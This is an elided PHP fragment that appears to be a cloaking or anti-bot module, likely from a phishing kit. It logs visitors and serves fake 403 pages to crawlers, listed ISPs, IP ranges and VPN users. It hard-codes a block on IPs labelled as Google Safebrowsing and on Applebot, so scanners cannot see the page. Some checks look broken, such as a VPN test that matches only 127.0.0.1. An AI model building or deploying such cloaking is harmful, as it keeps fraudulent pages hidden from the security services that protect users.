...
if($setting['block_host'] == "on") {
    foreach($blocked_words as $word) {
        if (substr_count($hostname, $word) > 0) {
            ...
            tulis_file("result/total_bot.txt","<tr><td><p class=\"text-danger\">$ip|Hostname</p></td></tr>");
...
if($setting['block_iprange'] == "on") {
    if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
              ...
              tulis_file("result/total_bot.txt","<tr><td><p class=\"text-danger\">$ip|IP Range</p></td></tr>");
              header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
              exit();
...
if($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" || $v_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)") {
        ...
        tulis_file("result/total_bot.txt","<tr><td><p class=\"text-danger\">$ip|User Agent</p></td></tr>");
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
        exit();
}
...
if($setting['block_iprange'] == "on"){
    foreach($ips as $ip) {
        if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
            $ip = getUserIP();
            tulis_file("block_bot.txt","BLOCKED IP RANGE || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
            tulis_file("result/total_bot.txt","<tr><td><p class=\"text-danger\">$ip|IP Range");
            header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            exit();
        }
...
if($setting['block_isp'] == "on"){
    foreach ($banned_isp as $isps) {
        if (substr_count($ispnya, $isps) > 0) {
          ...
          tulis_file("result/total_bot.txt","<tr><td><p class=\"text-danger\">$ip|ISP</p></td></tr>");
          header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
          exit();
        }
...
if($ip == "92.23.57.168" or $ip == "96.31.1.4" or $ip == "207.96.148.8") {
  ...
  tulis_file("result/total_bot.txt","<tr><td><p class=\"text-danger\">$ip|Google Safebrowsing</p></td></tr>");
  header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
...
if($setting['lock_platform'] == "on") {
    if($os == "iPhone" or $os == "iPad" or $os == "iPod" or $os == "Mac OS X" or $os == "Mac OS 9") {
      ...
      tulis_file("result/total_bot.txt","<tr><td><p class=\"text-danger\">$ip|Lock Platform</p></td></tr>");
      header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
      exit();
    }
...
if($setting['block_vpn'] == 'on') {
    if($ip == "127.0.0.1") {
      ...
      tulis_file("result/total_bot.txt","<tr><td><p class=\"text-danger\">$ip|VPN/Proxy</p></td></tr>");
      header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
      exit();
        }
